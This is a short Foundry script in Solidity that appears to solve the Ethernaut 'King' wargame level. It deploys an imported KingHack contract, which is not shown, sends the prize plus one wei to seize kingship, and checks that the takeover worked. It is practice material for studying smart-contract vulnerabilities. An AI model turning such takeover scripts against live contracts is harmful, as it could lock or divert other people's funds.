pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "../src/King/King.sol";
import "../src/King/KingHack.sol";

contract KingScript is Script {
    function run() public {
        address kingAddress = vm.envAddress("KING_ADDRESS");
        King ethernautKing = King(payable(kingAddress));

        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);

        uint prize = ethernautKing.prize();

        KingHack kingHack = new KingHack();
        kingHack.hack{value: prize + 1}(address(ethernautKing));

        require(ethernautKing._king() == address(kingHack), "king not changed");

        vm.stopBroadcast();
        console.log("SUCCESS");
    }
}